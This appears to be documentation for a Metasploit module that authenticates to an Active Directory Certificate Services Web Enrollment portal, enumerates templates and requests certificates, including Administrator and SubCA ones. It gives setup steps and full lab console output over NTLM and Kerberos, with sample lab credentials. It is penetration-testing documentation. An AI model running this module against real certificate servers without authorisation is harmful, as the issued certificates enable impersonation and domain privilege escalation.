## Vulnerable Application
This module makes authenticated requests to an Active Directory Certificate Services Web enrollment portal to gain
a list of available templates and/or generate certificates based on the available templates.
This is the same basic action as `auxiliary/server/relay/esc8` but rather then relaying NTLM credentials, we are
authenticating with credentials we have.

## Verification Steps

### NTLM
1. Install and configure the application
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host
2. Start `msfconsole`
2. Do: `use auxiliary/admin/http/web_enrollment_cert`
3. Set the `RHOSTS` option to the AD CS Web Enrollment server
4. Set the `HTTP::Auth` option to `ntlm`
4. Run the module and wait for a request to be relayed

### Kerberos
1. Install and configure the application
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host
2. Start `msfconsole`
2. Do: `use auxiliary/admin/http/web_enrollment_cert`
3. Set the `RHOSTS` option to the AD CS Web Enrollment server
4. Set the `HTTP::Auth` option to `kerberos`
5. Set the `DOMAIN` option to the FQDN
6. Set the `DomainControllerRhost` if it is not available through DNS
4. Run the module and wait for a request to be relayed

## Options

### MODE
The issue mode. This controls what the module will do once an authenticated session is established to the Web Enrollment
server. Must be one of the following options:

* ALL: Enumerate all available certificate templates and then issue each of them
* QUERY_ONLY: Enumerate all available certificate templates but do not issue any.  Not all certificate templates
  available for use will be displayed; templates with the flag CT_FLAG_MACHINE_TYPE set will not show available and
  include `Machine` (AKA `Computer`) and `DomainController`
* SPECIFIC_TEMPLATE: Issue the certificate template specified in the `CERT_TEMPLATE` option

### CERT_TEMPLATE
The template to issue if MODE is SPECIFIC_TEMPLATE.

## Scenarios

### Version and OS
#### NTLM
```
msf auxiliary(admin/http/web_enrollment_cert) > show options

Module options (auxiliary/admin/http/web_enrollment_cert):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   MODE       ALL              yes       The issue mode. (Accepted: ALL, QUERY_ONLY, SPECIFIC_TEMPLATE)
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h,
                                         sapni, socks4, http, socks5
   RHOSTS     10.5.132.180     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                         asploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /certsrv/        yes       The URI for the cert server.
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE                   no        The template to issue if MODE is SPECIFIC_TEMPLATE.


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/web_enrollment_cert) > show advanced

Module advanced options (auxiliary/admin/http/web_enrollment_cert):

   Name                     Current Setting                    Required  Description
   ----                     ---------------                    --------  -----------
   DOMAIN                   EXAMPLE                            yes       The domain to use for Windows authentication
   DigestAuthIIS            true                               no        Conform to IIS, should work for most servers. Only set to
                                                                         false for non-IIS servers
   FingerprintCheck         true                               no        Conduct a pre-exploit fingerprint verification
   HTTP::Auth               ntlm                               yes       The Authentication mechanism to use (Accepted: auto, ntlm,
                                                                          kerberos, plaintext, none)
   HttpClientTimeout                                           no        HTTP connection and receive timeout
   HttpPassword             v3Mpassword                        no        The HTTP password to specify for authentication
   HttpRawHeaders                                              no        Path to ERB-templatized raw headers to append to existing
                                                                         headers
   HttpTrace                false                              no        Show the raw HTTP requests and responses
   HttpTraceColors          red/blu                            no        HTTP request and response colors for HttpTrace (unset to d
                                                                         isable)
   HttpTraceHeadersOnly     false                              no        Show HTTP headers only in HttpTrace
   HttpUsername             Administrator                      no        The HTTP username to specify for authentication
   SSLKeyLogFile                                               no        The SSL key log file
   SSLServerNameIndication                                     no        SSL/TLS Server Name Indication (SNI)
   SSLVersion               Auto                               yes       Specify the version of SSL/TLS to be used (Auto, TLS and S
                                                                         SL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3
                                                                         , TLS1, TLS1.1, TLS1.2)
   ShowProgress             true                               yes       Display progress messages during a scan
   ShowProgressPercent      10                                 yes       The interval in percent that progress should be shown
   UserAgent                Mozilla/5.0 (Windows NT 10.0; Win  no        The User-Agent header to use for all requests
                            64; x64) AppleWebKit/537.36 (KHTM
                            L, like Gecko) Chrome/131.0.0.0 S
                            afari/537.36 Edg/131.0.2903.86
   VERBOSE                  true                               no        Enable detailed status messages
   WORKSPACE                                                   no        Specify the workspace for this module


   When HTTP::Auth is kerberos:

   Name                            Current Setting                 Required  Description
   ----                            ---------------                 --------  -----------
   DomainControllerRhost           10.5.132.180                    no        The resolvable rhost for the Domain Controller
   HTTP::Krb5Ccname                                                no        The ccache file to use for kerberos authentication
   HTTP::KrbOfferedEncryptionType  AES256,AES128,RC4-HMAC,DES-CBC  yes       Kerberos encryption types to offer
   s                               -MD5,DES3-CBC-SHA1
   HTTP::Rhostname                 WIN-DRC9HCDIMAT                 no        The rhostname which is required for kerberos - the SPN
   KrbCacheMode                    read-write                      yes       Kerberos ticket cache storage mode (Accepted: none, re
                                                                             ad-only, write-only, read-write)


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/web_enrollment_cert) > run
[*] Checking 10.5.132.180 URL /certsrv/
[*] Retrieving available template list, this may take a few minutes
[*] ***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***
[+] Available Certificates for EXAMPLE\\Administrator on : User, EFS, Administrator, EFSRecovery, ESC16_1, WebServer, SubCA
[*] Creating certificate request for EXAMPLE\\Administrator using the User template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template User and EXAMPLE\\Administrator
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=284&
[+] Certificate for EXAMPLE\\Administrator using template User saved to /home/tmoose/.msf4/loot/20251205150146_default_10.5.132.180_windows.ad.cs_351998.pfx
[*] Creating certificate request for EXAMPLE\\Administrator using the EFS template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template EFS and EXAMPLE\\Administrator
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=285&
[+] Certificate for EXAMPLE\\Administrator using template EFS saved to /home/tmoose/.msf4/loot/20251205150147_default_10.5.132.180_windows.ad.cs_398852.pfx
[*] Creating certificate request for EXAMPLE\\Administrator using the Administrator template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template Administrator and EXAMPLE\\Administrator
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=286&
[+] Certificate for EXAMPLE\\Administrator using template Administrator saved to /home/tmoose/.msf4/loot/20251205150148_default_10.5.132.180_windows.ad.cs_310441.pfx
[*] Creating certificate request for EXAMPLE\\Administrator using the EFSRecovery template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template EFSRecovery and EXAMPLE\\Administrator
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=287&
[+] Certificate for EXAMPLE\\Administrator using template EFSRecovery saved to /home/tmoose/.msf4/loot/20251205150151_default_10.5.132.180_windows.ad.cs_547091.pfx
[*] Creating certificate request for EXAMPLE\\Administrator using the ESC16_1 template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template ESC16_1 and EXAMPLE\\Administrator
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=288&
[+] Certificate for EXAMPLE\\Administrator using template ESC16_1 saved to /home/tmoose/.msf4/loot/20251205150152_default_10.5.132.180_windows.ad.cs_468150.pfx
[*] Creating certificate request for EXAMPLE\\Administrator using the WebServer template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template WebServer and EXAMPLE\\Administrator
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=289&
[+] Certificate for EXAMPLE\\Administrator using template WebServer saved to /home/tmoose/.msf4/loot/20251205150154_default_10.5.132.180_windows.ad.cs_702283.pfx
[*] Creating certificate request for EXAMPLE\\Administrator using the SubCA template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template SubCA and EXAMPLE\\Administrator
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=290&
[+] Certificate for EXAMPLE\\Administrator using template SubCA saved to /home/tmoose/.msf4/loot/20251205150155_default_10.5.132.180_windows.ad.cs_846566.pfx
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/http/web_enrollment_cert) > 

```

#### Kerberos
```msf
msf auxiliary(admin/http/web_enrollment_cert) > set HTTP::Auth kerberos 
HTTP::Auth => kerberos
msf auxiliary(admin/http/web_enrollment_cert) > set domain example.com
domain => example.com
msf auxiliary(admin/http/web_enrollment_cert) > show options

Module options (auxiliary/admin/http/web_enrollment_cert):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   MODE       ALL              yes       The issue mode. (Accepted: ALL, QUERY_ONLY, SPECIFIC_TEMPLATE)
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h,
                                         sapni, socks4, http, socks5
   RHOSTS     10.5.132.180     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                         asploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /certsrv/        yes       The URI for the cert server.
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE                   no        The template to issue if MODE is SPECIFIC_TEMPLATE.


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/web_enrollment_cert) > show advanced

Module advanced options (auxiliary/admin/http/web_enrollment_cert):

   Name                     Current Setting                    Required  Description
   ----                     ---------------                    --------  -----------
   DOMAIN                   example.com                        yes       The domain to use for Windows authentication
   DigestAuthIIS            true                               no        Conform to IIS, should work for most servers. Only set to
                                                                         false for non-IIS servers
   FingerprintCheck         true                               no        Conduct a pre-exploit fingerprint verification
   HTTP::Auth               kerberos                           yes       The Authentication mechanism to use (Accepted: auto, ntlm,
                                                                          kerberos, plaintext, none)
   HttpClientTimeout                                           no        HTTP connection and receive timeout
   HttpPassword             v3Mpassword                        no        The HTTP password to specify for authentication
   HttpRawHeaders                                              no        Path to ERB-templatized raw headers to append to existing
                                                                         headers
   HttpTrace                false                              no        Show the raw HTTP requests and responses
   HttpTraceColors          red/blu                            no        HTTP request and response colors for HttpTrace (unset to d
                                                                         isable)
   HttpTraceHeadersOnly     false                              no        Show HTTP headers only in HttpTrace
   HttpUsername             Administrator                      no        The HTTP username to specify for authentication
   SSLKeyLogFile                                               no        The SSL key log file
   SSLServerNameIndication                                     no        SSL/TLS Server Name Indication (SNI)
   SSLVersion               Auto                               yes       Specify the version of SSL/TLS to be used (Auto, TLS and S
                                                                         SL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3
                                                                         , TLS1, TLS1.1, TLS1.2)
   ShowProgress             true                               yes       Display progress messages during a scan
   ShowProgressPercent      10                                 yes       The interval in percent that progress should be shown
   UserAgent                Mozilla/5.0 (Windows NT 10.0; Win  no        The User-Agent header to use for all requests
                            64; x64) AppleWebKit/537.36 (KHTM
                            L, like Gecko) Chrome/131.0.0.0 S
                            afari/537.36 Edg/131.0.2903.86
   VERBOSE                  true                               no        Enable detailed status messages
   WORKSPACE                                                   no        Specify the workspace for this module


   When HTTP::Auth is kerberos:

   Name                            Current Setting                 Required  Description
   ----                            ---------------                 --------  -----------
   DomainControllerRhost           10.5.132.180                    no        The resolvable rhost for the Domain Controller
   HTTP::Krb5Ccname                                                no        The ccache file to use for kerberos authentication
   HTTP::KrbOfferedEncryptionType  AES256,AES128,RC4-HMAC,DES-CBC  yes       Kerberos encryption types to offer
   s                               -MD5,DES3-CBC-SHA1
   HTTP::Rhostname                 WIN-DRC9HCDIMAT                 no        The rhostname which is required for kerberos - the SPN
   KrbCacheMode                    read-write                      yes       Kerberos ticket cache storage mode (Accepted: none, re
                                                                             ad-only, write-only, read-write)


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/web_enrollment_cert) > run
[*] Retrieving available template list, this may take a few minutes
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150453_default_10.5.132.180_mit.kerberos.cca_822972.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150454_default_10.5.132.180_mit.kerberos.cca_873951.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[*] ***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***
[+] Available Certificates for  on : User, EFS, Administrator, EFSRecovery, ESC16_1, WebServer, SubCA
[*] Creating certificate request for  using the User template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150511_default_10.5.132.180_mit.kerberos.cca_838736.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150512_default_10.5.132.180_mit.kerberos.cca_378054.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template User and 
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=291&
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150513_default_10.5.132.180_mit.kerberos.cca_678953.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150514_default_10.5.132.180_mit.kerberos.cca_501174.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template User saved to /home/tmoose/.msf4/loot/20251205150514_default_10.5.132.180_windows.ad.cs_544884.pfx
[*] Creating certificate request for  using the EFS template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150517_default_10.5.132.180_mit.kerberos.cca_990027.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150518_default_10.5.132.180_mit.kerberos.cca_635605.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template EFS and 
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=292&
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150519_default_10.5.132.180_mit.kerberos.cca_444641.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150519_default_10.5.132.180_mit.kerberos.cca_997726.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template EFS saved to /home/tmoose/.msf4/loot/20251205150520_default_10.5.132.180_windows.ad.cs_057988.pfx
[*] Creating certificate request for  using the Administrator template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150523_default_10.5.132.180_mit.kerberos.cca_612724.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150523_default_10.5.132.180_mit.kerberos.cca_133172.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template Administrator and 
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=293&
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150524_default_10.5.132.180_mit.kerberos.cca_076572.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150525_default_10.5.132.180_mit.kerberos.cca_141364.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template Administrator saved to /home/tmoose/.msf4/loot/20251205150525_default_10.5.132.180_windows.ad.cs_898079.pfx
[*] Creating certificate request for  using the EFSRecovery template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150527_default_10.5.132.180_mit.kerberos.cca_092867.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150528_default_10.5.132.180_mit.kerberos.cca_037432.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template EFSRecovery and 
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=294&
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150529_default_10.5.132.180_mit.kerberos.cca_777681.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150529_default_10.5.132.180_mit.kerberos.cca_507259.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template EFSRecovery saved to /home/tmoose/.msf4/loot/20251205150530_default_10.5.132.180_windows.ad.cs_382790.pfx
[*] Creating certificate request for  using the ESC16_1 template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150532_default_10.5.132.180_mit.kerberos.cca_537546.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150533_default_10.5.132.180_mit.kerberos.cca_539326.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template ESC16_1 and 
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=295&
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150534_default_10.5.132.180_mit.kerberos.cca_276777.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150535_default_10.5.132.180_mit.kerberos.cca_717376.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template ESC16_1 saved to /home/tmoose/.msf4/loot/20251205150535_default_10.5.132.180_windows.ad.cs_525359.pfx
[*] Creating certificate request for  using the WebServer template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150537_default_10.5.132.180_mit.kerberos.cca_267094.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150538_default_10.5.132.180_mit.kerberos.cca_805790.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template WebServer and 
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=296&
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150539_default_10.5.132.180_mit.kerberos.cca_341518.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150540_default_10.5.132.180_mit.kerberos.cca_437824.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template WebServer saved to /home/tmoose/.msf4/loot/20251205150540_default_10.5.132.180_windows.ad.cs_080961.pfx
[*] Creating certificate request for  using the SubCA template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150543_default_10.5.132.180_mit.kerberos.cca_725235.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150544_default_10.5.132.180_mit.kerberos.cca_667357.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template SubCA and 
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=297&
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150545_default_10.5.132.180_mit.kerberos.cca_662646.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150546_default_10.5.132.180_mit.kerberos.cca_344890.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template SubCA saved to /home/tmoose/.msf4/loot/20251205150546_default_10.5.132.180_windows.ad.cs_209545.pfx
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/http/web_enrollment_cert) > 


```

